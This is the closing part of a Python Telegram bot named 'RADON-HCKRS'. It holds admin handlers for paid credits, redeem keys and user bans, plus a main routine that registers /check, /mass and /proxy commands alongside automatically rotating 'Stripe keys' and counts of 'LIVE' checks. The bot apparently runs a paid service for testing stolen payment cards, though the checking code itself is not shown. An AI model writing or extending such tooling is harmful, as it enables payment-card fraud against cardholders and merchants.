              (key, credits, user_id, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(
        f"✅ **Key Created!**\n\n"
        f"🔑 **Key:** `{key}`\n"
        f"💰 **Credits:** `{credits}`\n"
        f"🕐 **Created:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='Markdown'
    )

async def admin_add_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    if len(context.args) < 2:
        await update.message.reply_text(
            "`/addcredits 123456789 50` - Adds credits to user",
            parse_mode='Markdown'
        )
        return
    
    try:
        target_id = int(context.args[0])
        amount = int(context.args[1])
    except ValueError:
        await update.message.reply_text("❌ Invalid input.")
        return
    
    add_credits(target_id, amount)
    
    await update.message.reply_text(
        f"✅ **Credits Added!**\n\n"
        f"👤 User ID: `{target_id}`\n"
        f"💰 Amount: `{amount}`\n"
        f"💳 New Balance: `{get_credits(target_id)}`",
        parse_mode='Markdown'
    )

async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("`/ban 123456789` - Bans user", parse_mode='Markdown')
        return
    
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return
    
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (target_id,))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(f"✅ User `{target_id}` has been banned.", parse_mode='Markdown')

async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("`/unban 123456789` - Unbans user", parse_mode='Markdown')
        return
    
    try:
        target_id = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID.")
        return
    
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (target_id,))
    conn.commit()
    conn.close()
    
    await update.message.reply_text(f"✅ User `{target_id}` has been unbanned.", parse_mode='Markdown')

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return
    
    conn = sqlite3.connect('radon.db')
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM users")
    total_users = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM redeem_keys WHERE is_used = 0")
    unused_keys = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM check_logs")
    total_checks = c.fetchone()[0]
    
    c.execute("SELECT SUM(credits) FROM users")
    total_credits = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM key_usage WHERE status LIKE '%LIVE%'")
    live_checks = c.fetchone()[0]
    
    conn.close()
    
    await update.message.reply_text(
        f"📊 **Admin Stats**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **Users:** `{total_users}`\n"
        f"🔑 **Unused Keys:** `{unused_keys}`\n"
        f"📈 **Total Checks:** `{total_checks}`\n"
        f"💰 **Total Credits:** `{total_credits}`\n"
        f"✅ **Live Checks:** `{live_checks}`\n"
        f"🔐 **Keys in Rotation:** `{key_manager.get_key_count()}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔥 **RADON-HCKRS**",
        parse_mode='Markdown'
    )

# ============================================
# MAIN BOT
# ============================================

def main():
    print("🔥 RADON-HCKRS Ultimate Bot Starting...")
    print("━━━━━━━━━━━━━━━━━━━━━")
    print(f"🔑 Loaded {key_manager.get_key_count()} Stripe keys")
    print("💀 All keys rotating automatically")
    print("━━━━━━━━━━━━━━━━━━━━━")
    
    init_db()
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("mass", mass_command))
    application.add_handler(CommandHandler("proxy", proxy_command))
    application.add_handler(CommandHandler("keys", keys_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("help", help_command))
    
    # Admin commands
    application.add_handler(CommandHandler("createkey", admin_create_key))
    application.add_handler(CommandHandler("addcredits", admin_add_credits))
    application.add_handler(CommandHandler("ban", admin_ban))
    application.add_handler(CommandHandler("unban", admin_unban))
    application.add_handler(CommandHandler("stats", admin_stats))
    
    # Button handler
    application.add_handler(CallbackQueryHandler(button_handler))
    
    print("✅ Bot is running!")
    print("🔥 RADON-HCKRS Active")
    print("━━━━━━━━━━━━━━━━━━━━━")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
